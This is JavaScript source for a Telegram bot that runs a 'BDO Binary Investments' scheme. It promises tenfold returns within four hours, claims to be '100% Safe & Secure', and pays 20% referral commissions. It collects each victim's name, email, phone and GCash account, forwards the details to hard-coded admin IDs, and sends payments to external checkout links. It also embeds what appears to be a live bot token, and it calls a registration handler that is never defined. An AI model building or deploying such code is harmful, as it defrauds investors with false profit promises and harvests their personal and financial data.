import TelegramBot from "node-telegram-bot-api";
import pm2 from "pm2";
import http from 'http';
import cron from 'node-cron';
import fetch from 'node-fetch';
import fs from 'fs';
import path from 'path';

// =============================================
// DATABASE SYSTEM
// =============================================
const DB_FILE = 'users.json';
let userDatabase = new Map();

// Load database from file
function loadDatabase() {
    try {
        if (fs.existsSync(DB_FILE)) {
            const data = fs.readFileSync(DB_FILE, 'utf8');
            const parsed = JSON.parse(data);
            userDatabase = new Map(parsed.map(user => [user[0], user[1]]));
            console.log(`Database loaded with ${userDatabase.size} users`);
        }
    } catch (error) {
        console.error('Error loading database:', error);
    }
}

// Save database to file
function saveDatabase() {
    try {
        const data = JSON.stringify(Array.from(userDatabase.entries()), null, 2);
        fs.writeFileSync(DB_FILE, data);
    } catch (error) {
        console.error('Error saving database:', error);
    }
}

// Initialize database
loadDatabase();

// =============================================
// BOT CONFIGURATION
// =============================================
const bot = new TelegramBot("7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY", { polling: true });

// Admin user IDs to notify
const ADMIN_IDS = [6300694007, 7279302614];

// Image URLs
const IMAGES = [
    "https://files.catbox.moe/mbbbch.jpg",
    "https://files.catbox.moe/bef1af.jpg"
];

// Registration steps
const REGISTRATION_STEPS = {
    START: "start",
    FULL_NAME: "full_name",
    GENDER: "gender",
    EMAIL: "email",
    PHONE: "phone",
    COUNTRY: "country",
    GCASH_NAME: "gcash_name",
    GCASH_ACCOUNT: "gcash_account",
    COMPLETE: "complete"
};

// Investment Plans
const investmentPlans = [
    { amount: "₱2,000", earnings: "₱20,000", link: "https://selar.com/134f95", short: "2K" },
    { amount: "₱3,000", earnings: "₱30,000", link: "https://selar.com/16d46h", short: "3K" },
    { amount: "₱5,000", earnings: "₱50,000", link: "https://selar.com/57m07s", short: "5K" },
    { amount: "₱10,000", earnings: "₱70,000", link: "https://selar.com/631047", short: "10K" },
    { amount: "₱15,000", earnings: "₱130,000", link: "https://selar.com/79eqol", short: "15K" },
    { amount: "₱20,000", earnings: "₱170,000", link: "https://selar.com/1006fr", short: "20K" }
];


// =============================================
// MENU BUTTON SYSTEM
// =============================================

// Main menu keyboard
const mainMenuButtons = {
    reply_markup: {
        keyboard: [
            [{ text: "💰 INVESTMENT PLANS" }],
            [{ text: "👥 REFERRAL PROGRAM" }],
            [{ text: "👤 MY ACCOUNT" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// Investment plans inline keyboard
const investmentPlanButtons = {
    reply_markup: {
        inline_keyboard: [
            ...chunkArray(investmentPlans.map(plan => ({
                text: `${plan.amount} → ${plan.earnings}`,
                callback_data: `plan_${plan.short}`
            })), 2),
            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
        ]
    }
};

// Account management buttons
const accountButtons = {
    reply_markup: {
        inline_keyboard: [
            [{ text: "📝 VIEW MY DETAILS", callback_data: "view_details" }],
            [{ text: "🗑️ DELETE ACCOUNT", callback_data: "delete_account" }],
            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
        ]
    }
};

// Referral menu buttons
const referralButtons = {
    reply_markup: {
        inline_keyboard: [
            [{ text: "📤 SHARE REFERRAL LINK", callback_data: "share_referral" }],
            [{ text: "💰 VIEW EARNINGS", callback_data: "view_earnings" }],
            [{ text: "⬅️ BACK TO MENU", callback_data: "back_to_menu" }]
        ]
    }
};

// =============================================
// HELPER FUNCTIONS
// =============================================
function getRandomImage() {
    return IMAGES[Math.floor(Math.random() * IMAGES.length)];
}

function generateReferralCode(userId) {
    return `BDO-${userId.toString().slice(-6)}`;
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validatePhone(phone) {
    return /^[0-9]{10,15}$/.test(phone);
}

function chunkArray(arr, size) {
    return Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
        arr.slice(i * size, i * size + size)
    );
}

async function sendMessageWithImage(chatId, message, options = {}) {
    try {
        return await bot.sendPhoto(chatId, getRandomImage(), {
            caption: message,
            parse_mode: "Markdown",
            ...options
        });
    } catch (error) {
        console.error('Error sending message with image:', error);
        // Fallback to text message if photo fails
        return await bot.sendMessage(chatId, message, { 
            parse_mode: "Markdown",
            ...options 
        });
    }
}

async function notifyAdmins(message) {
    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendMessage(adminId, message, { parse_mode: "Markdown" });
        } catch (error) {
            console.error(`Failed to notify admin ${adminId}:`, error);
        }
    }
}

function formatUserDetails(user) {
    return `👤 *Account Details* 👤\n\n` +
        `🆔 *User ID:* ${user.id}\n` +
        `📅 *Registered:* ${new Date(user.registrationDate).toLocaleString()}\n` +
        `👤 *Full Name:* ${user.registrationData.fullName}\n` +
        `⚤ *Gender:* ${user.registrationData.gender}\n` +
        `📧 *Email:* ${user.registrationData.email}\n` +
        `📱 *Phone:* ${user.registrationData.phone}\n` +
        `🌍 *Country:* ${user.registrationData.country}\n` +
        `💳 *GCash Name:* ${user.registrationData.gcashName}\n` +
        `📱 *GCash Number:* ${user.registrationData.gcashAccount}\n\n` +
        `💰 *Balance:* ₱${user.balance.toFixed(2)}\n` +
        `🔗 *Referral Code:* ${user.referralCode}\n` +
        `👥 *Referred By:* ${user.referredBy || 'None'}`;
}

// =============================================
// MENU FUNCTIONS
// =============================================

// Show main menu
async function showMainMenu(chatId) {
    const menuMessage = `🏦 *BDO Investment Bot*\n\n` +
        `🔒 Secure | 💰 Profitable | 🚀 Fast\n\n` +
        `Select an option below to get started:`;
    
    await bot.sendMessage(chatId, menuMessage, {
        parse_mode: "Markdown",
        ...mainMenuButtons
    });
}

async function showReferralMenu(chatId, userId) {
    const user = userDatabase.get(userId);
    const referralMessage = `👥 *Referral Program*\n\n` +
        `Earn 20% commission from every investment made by your referrals!\n\n` +
        `🔗 Your unique referral link:\n` +
        `https://t.me/BDOInvestmentsBot?start=${user.referralCode}\n\n` +
        `💰 Total Earnings: ₱${user.balance.toFixed(2)}`;
    
    await bot.sendMessage(chatId, referralMessage, {
        parse_mode: "Markdown",
        ...referralButtons
    });
}

async function showAccountMenu(chatId, userId) {
    const accountMessage = `👤 *Account Management*\n\n` +
        `Manage your account details and settings:`;
    
    await bot.sendMessage(chatId, accountMessage, {
        parse_mode: "Markdown",
        ...accountButtons
    });
}

// =============================================
// COMMAND HANDLERS
// =============================================

// Command: /start with referral support
bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const referralCode = match[1];
    const username = msg.from.username ? `@${msg.from.username}` : 'No username';

    // Check if user exists and is already registered
    if (userDatabase.has(userId)) {
        const user = userDatabase.get(userId);
        
        if (user.step === REGISTRATION_STEPS.COMPLETE) {
            const welcomeBackMessage = `👋 *Welcome back, ${user.name}!*`;
            await sendMessageWithImage(chatId, welcomeBackMessage);
            return await showMainMenu(chatId);
        }
    }

    // Initialize new user
    userDatabase.set(userId, {
        id: userId,
        name: msg.from.first_name || "Investor",
        username: username,
        referralCode: generateReferralCode(userId),
        referredBy: referralCode || null,
        balance: 0,
        investments: [],
        step: REGISTRATION_STEPS.START,
        registrationDate: new Date(),
        registrationData: {}
    });
    saveDatabase();

    // Notify admins about new registration
    const notifyMessage = `🆕 *New Account Started*\n\n` +
        `User: ${msg.from.first_name || 'No name'} ${username}\n` +
        `ID: ${userId}\n` +
        `Referral: ${referralCode || 'Direct'}`;
    
    await notifyAdmins(notifyMessage);

    // If came through referral, notify referrer
    if (referralCode) {
        const referrer = [...userDatabase.entries()].find(
            ([_, user]) => user.referralCode === referralCode
        );
        if (referrer) {
            const [referrerId, referrerData] = referrer;
            await sendMessageWithImage(referrerId, 
                `🎉 New referral joined!\n\n${msg.from.first_name || 'New user'} signed up using your link!`);
        }
    }

    const welcomeMessage = `*Welcome To BDO Binary Investments!*\n\n` +
        `🔒 *100% Safe & Secure*\n💰 *100% Profit Payout*\n🚫 No Fees\n\n` +
        `Please complete your registration to start investing!`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📝 Register Now", callback_data: "start_registration" }]
            ]
        }
    };

    await sendMessageWithImage(chatId, welcomeMessage, options);
});

// Handle menu button clicks
bot.on("message", async (msg) => {
    if (msg.text?.startsWith('/')) return;
    
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text?.trim();

    if (!userDatabase.has(userId)) {
        return await showMainMenu(chatId);
    }

    const user = userDatabase.get(userId);

    switch (text) {
        case "💰 INVESTMENT PLANS":
            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
            }
            await showInvestmentPlans(chatId);
            break;
            
        case "👥 REFERRAL PROGRAM":
            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
            }
            await showReferralMenu(chatId, userId);
            break;
            
        case "👤 MY ACCOUNT":
            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
            }
            await showAccountMenu(chatId, userId);
            break;
            
        default:
            // Handle registration steps
            await handleRegistrationStep(chatId, userId, text);
            break;
    }
});

// Handle callback queries
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data;
    const username = query.from.username ? `@${query.from.username}` : 'No username';

    await bot.answerCallbackQuery(query.id);

    if (!userDatabase.has(userId)) {
        return await sendMessageWithImage(chatId, "Please /start first to begin");
    }

    const user = userDatabase.get(userId);

    switch (data) {
        case "start_registration":
            await startRegistration(chatId, userId);
            break;
            
        case "invest_now":
            if (user.step !== REGISTRATION_STEPS.COMPLETE) {
                return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\nUse /start to begin.");
            }
            await showInvestmentPlans(chatId);
            break;
            
        case "view_plans":
            await showInvestmentPlans(chatId);
            break;
            
        case "back_to_menu":
            await showMainMenu(chatId);
            break;
            
        case "view_details":
            await sendMessageWithImage(chatId, formatUserDetails({...user, id: userId}));
            break;
            
        case "share_referral":
            const shareMessage = `📤 *Share Your Referral Link*\n\n` +
                `Copy this message to share with friends:\n\n` +
                `Join BDO Binary Investments using my link! ` +
                `I've earned ₱${user.balance.toFixed(2)} from referrals! ` +
                `Here's my link: https://t.me/BDOInvestmentsBot?start=${user.referralCode}`;
            await bot.sendMessage(chatId, shareMessage);
            break;
            
        case "view_earnings":
            await bot.sendMessage(chatId, 
                `💰 Your total referral earnings: ₱${user.balance.toFixed(2)}`);
            break;
            
        case "delete_account":
            await handleAccountDeletion(chatId, userId);
            break;
            
        case "confirm_delete":
            userDatabase.delete(userId);
            saveDatabase();
            await sendMessageWithImage(chatId, "🗑️ *Account Deleted*\n\nYour account and all data have been permanently removed.");
            break;
            
        case "cancel_delete":
            await sendMessageWithImage(chatId, "Account deletion cancelled. Your data remains safe with us.");
            break;
            
        default:
            if (data.startsWith("plan_")) {
                const planShort = data.split('_')[1];
                const plan = investmentPlans.find(p => p.short === planShort);
                if (plan) {
                    await processInvestment(chatId, userId, plan);
                }
            }
            break;
    }
});

// Handle messages
bot.on("message", async (msg) => {
    if (msg.text?.startsWith('/')) return;
    
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text?.trim();
    const username = msg.from.username ? `@${msg.from.username}` : 'No username';

    if (!userDatabase.has(userId)) return;

    const user = userDatabase.get(userId);

    switch (user.step) {
        case REGISTRATION_STEPS.FULL_NAME:
            user.registrationData.fullName = text;
            user.step = REGISTRATION_STEPS.GENDER;
            await sendMessageWithImage(chatId, "📝 *Gender:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.GENDER:
            user.registrationData.gender = text;
            user.step = REGISTRATION_STEPS.EMAIL;
            await sendMessageWithImage(chatId, "📧 *Email Address:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.EMAIL:
            if (!validateEmail(text)) {
                await sendMessageWithImage(chatId, "⚠️ Invalid email. Please enter a valid email:");
                return;
            }
            user.registrationData.email = text;
            user.step = REGISTRATION_STEPS.PHONE;
            await sendMessageWithImage(chatId, "📱 *Phone Number:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.PHONE:
            if (!validatePhone(text)) {
                await sendMessageWithImage(chatId, "⚠️ Invalid phone number. Please enter a valid number:");
                return;
            }
            user.registrationData.phone = text;
            user.step = REGISTRATION_STEPS.COUNTRY;
            await sendMessageWithImage(chatId, "🌍 *Country:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.COUNTRY:
            user.registrationData.country = text;
            user.step = REGISTRATION_STEPS.GCASH_NAME;
            await sendMessageWithImage(chatId, "💳 *GCash Name:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.GCASH_NAME:
            user.registrationData.gcashName = text;
            user.step = REGISTRATION_STEPS.GCASH_ACCOUNT;
            await sendMessageWithImage(chatId, "📱 *GCash Account Number:*");
            saveDatabase();
            break;
            
        case REGISTRATION_STEPS.GCASH_ACCOUNT:
            user.registrationData.gcashAccount = text;
            user.step = REGISTRATION_STEPS.COMPLETE;
            saveDatabase();
            
            // Notify admins about completed registration
            const notifyMessage = `✅ *Registration Completed*\n\n` +
                `User: ${user.name} ${username}\n` +
                `ID: ${userId}\n` +
                `Phone: ${user.registrationData.phone}\n` +
                `Country: ${user.registrationData.country}`;
            
            await notifyAdmins(notifyMessage);
            
            await completeRegistration(chatId, user);
            break;
    }
});

// =============================================
// MAIN FUNCTIONS
// =============================================

async function startRegistration(chatId, userId) {
    const user = userDatabase.get(userId);
    user.step = REGISTRATION_STEPS.FULL_NAME;
    user.registrationData = {};
    saveDatabase();
    await sendMessageWithImage(chatId, "📝 *Full Name:*");
}

async function showInvestmentPlans(chatId) {
    let plansText = "💰 *Investment Plans (4 Hours Duration)* 💰\n\n";
    plansText += "*Invest Amount* ➔ *Get Paid*\n\n";
    
    investmentPlans.forEach(plan => {
        plansText += `▸ ${plan.amount} ➔ ${plan.earnings}\n`;
    });

    plansText += "\nClick any amount below to invest:";

    const buttons = investmentPlans.map(plan => ({
        text: `${plan.amount} → ${plan.earnings}`,
        callback_data: `plan_${plan.short}`
    }));

    const options = {
        reply_markup: {
            inline_keyboard: chunkArray(buttons, 2)
        }
    };

    await sendMessageWithImage(chatId, plansText, options);
}

async function completeRegistration(chatId, user) {
    const confirmation = `✅ *Registration Complete!*\n\n` +
        `You can now access all features using the menu below.`;
    
    await sendMessageWithImage(chatId, confirmation);
    await showMainMenu(chatId);
}

async function processInvestment(chatId, userId, plan) {
    const user = userDatabase.get(userId);
    
    // Record investment
    user.investments.push({
        amount: plan.amount.replace('₱', '').replace(/,/g, ''),
        date: new Date(),
        status: "pending"
    });
    saveDatabase();

    // Credit referrer if exists
    if (user.referredBy) {
        const referrer = [...userDatabase.entries()].find(
            ([_, u]) => u.referralCode === user.referredBy
        );
        if (referrer) {
            const [referrerId, referrerData] = referrer;
            const commission = parseInt(plan.amount.replace('₱', '').replace(/,/g, '')) * 0.20;
            referrerData.balance += commission;
            userDatabase.set(referrerId, referrerData);
            saveDatabase();
            
            // Notify referrer
            await sendMessageWithImage(referrerId,
                `🎉 *New Referral Earnings!*\n\n` +
                `You earned ₱${commission.toFixed(2)} from ${user.name}'s investment!\n` +
                `💰 *Total Balance:* ₱${referrerData.balance.toFixed(2)}`);
        }
    }

    // Send payment instructions
    const paymentMessage = `💵 *Investment Confirmation: ${plan.amount}*\n\n` +
        `You will be redirected to our secure payment website to complete your investment.\n\n` +
        `🔄 *Payment Process:*\n` +
        `1. Click the "Pay Now" button below\n` +
        `2. You'll be taken to our secure payment gateway\n` +
        `3. Complete your payment details\n` +
        `4. Submit your payment\n` +
        `5. You'll receive confirmation within 4 hours\n\n` +
        `💰 *Expected Return:* ${plan.earnings}\n\n` +
        `Click below to proceed to payment:`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "💳 Pay Now", url: plan.link }],
                [{ text: "⬅️ Back to Plans", callback_data: "view_plans" }]
            ]
        }
    };

    await sendMessageWithImage(chatId, paymentMessage, options);
}

async function handleAccountDeletion(chatId, userId) {
    const confirmationMessage = `⚠️ *Confirm Account Deletion* ⚠️\n\n` +
        `Are you sure you want to delete your account? This will:\n\n` +
        `• Permanently remove all your data\n` +
        `• Cancel any pending investments\n` +
        `• Remove your referral earnings\n\n` +
        `This action cannot be undone!`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🗑️ Yes, Delete My Account", callback_data: "confirm_delete" }],
                [{ text: "❌ No, Keep My Account", callback_data: "cancel_delete" }]
            ]
        }
    };

    await sendMessageWithImage(chatId, confirmationMessage, options);
}

// Start the bot
console.log("BDO Investment Bot with professional menu system is running...");
